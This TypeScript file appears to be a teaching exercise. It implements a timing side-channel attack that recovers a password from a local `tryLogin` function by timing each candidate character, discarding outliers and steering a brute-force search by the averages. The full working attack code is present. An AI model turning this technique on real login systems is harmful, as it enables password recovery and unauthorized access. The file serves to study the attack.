import { tryLogin, PASSWORD_LENGTH, ALPHABET} from './login'
import { percentile } from 'es-toolkit/bigint'
import { shuffle } from 'es-toolkit/array';

/*
   Refined version of `attack.ts`. The idea is that we'll use the signal 
   to guide the brute-force search. We'll need to get a much higher-fidelity
   signal to do this, however.
*/

const TRIALS_PER_CHAR = 100
const WARMUP_RUNS = 10
const DEPTH_LIMIT = Infinity // debugging only; Infinity for the full search
const DEBUG_MODE = false

/**
 * A dictionary to record lists of times, indexed by prefix string.
 * This TypeScript syntax says "The key can be any string; the value must be a T".
 */
interface Lookup<T> {
  [key: string]: T;
}

/**
 * Bignums use a special syntax to keep them separate from ordinary numbers.
 * Taken from Gemini (with some review).
 * @param values
 * @returns
 */
function averageBigInt(values: bigint[]): bigint {
  if (values.length === 0) return 0n;

  const sum = values.reduce((acc, val) => acc + val, 0n);
  return sum / BigInt(values.length);
}

function trial(char: string, str: string, results: Lookup<bigint[]>) {
    if(str.length !== PASSWORD_LENGTH) throw Error()
    const start = process.hrtime.bigint()
    tryLogin(str)
    const total = process.hrtime.bigint() - start
    
    if(results[char] === undefined) results[char] = []
    results[char].push(total)
  }

function main() {
  console.log("Warming up...")
  warmup()
  console.log("Running...")
  helper('', 0)
}

/* ** Warm up before real measurements **  */
function warmup() {
  const fake: Lookup<bigint[]> = {}
  for (let i = 0; i < WARMUP_RUNS; i++) {
    for(const c of ALPHABET)
      trial(c, c.repeat(PASSWORD_LENGTH), fake) // TODO
  }
}

/** This is the brute-force search, modified so that it uses timing statistics
 *  as a compass to decide where to go next. */
function helper(prefix: string, depth: number) {
  if(depth >= DEPTH_LIMIT) return false

  if(prefix.length === PASSWORD_LENGTH)
    return tryLogin(prefix)

  const results: Lookup<bigint[]> = {}
  const averages: Lookup<bigint> = {}

  // ** Pre-populate guesses **
  const guesses: Lookup<string[]> = {}
  for(let ii = 0; ii < TRIALS_PER_CHAR; ii++) {
    for(const char of shuffle(Array.from(ALPHABET))) {
      if(guesses[char] === undefined) { guesses[char] = [] }
      guesses[char].push(prefix + char + generateRandomString(PASSWORD_LENGTH-(prefix.length+1), ALPHABET))
    }
  }

  // ** DON'T BATCH! **
  // It turns out to be important to have the char-choice as the inner loop.
  // If we batch all the trials for a character together, one event outside 
  // our control would impact one character disproportionately.
  for(let ii = 0; ii < TRIALS_PER_CHAR; ii++) {
    for(const char of shuffle(Array.from(ALPHABET)))
      trial(char, guesses[char][ii], results)
  }

  for(const char of ALPHABET) {
    // ** REMOVE OUTLIERS **
    // I'm using a library's `percentile` here to make my life easier.
    const lo = percentile(results[char], 10), hi = percentile(results[char], 90)
    // Take the average as before, but filter out the outliers.
    averages[char] = averageBigInt(results[char].filter(x => x >= lo && x <= hi))
    if(DEBUG_MODE)
      console.log(`${' '.repeat(depth*2)}prefix+c: ${prefix+char} average: ${averages[char]}`)
  }
  
  // ** STEER THE SEARCH BASED ON DATA **
  // Options, in order of likelihood.
  const sorted: string[] = Object.entries(averages)
    .sort(([, x], [, y]) => (x > y ? -1 : x < y ? 1 : 0))
    .map(([ch]) => ch);
  
  // Finally, actually run the search.
  for(const guess of sorted) {
    console.log(`${' '.repeat(depth*2)}guessing: ${prefix+guess}`)
    if(helper(prefix+guess, depth+1) === true) return true
  }
  return false
}

main()

/**
 * Used for building random suffixes for trial prefixes.
 *
 * Notice that I spent a couple of minutes reviewing and modifying this
 * after I got it from Gemini. If you aren't exercising even a little
 * due diligence when using agent-generated code, it will become a problem. :-(
 *
 * @param length How long a suffix do we need?
 * @param charset Which characters are available to use?
 * @returns a random string of the given length
 */
function generateRandomString(length: number, charset: string): string {
  let result = '';

  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * charset.length);
    result += charset[randomIndex];
  }

  return result;
}

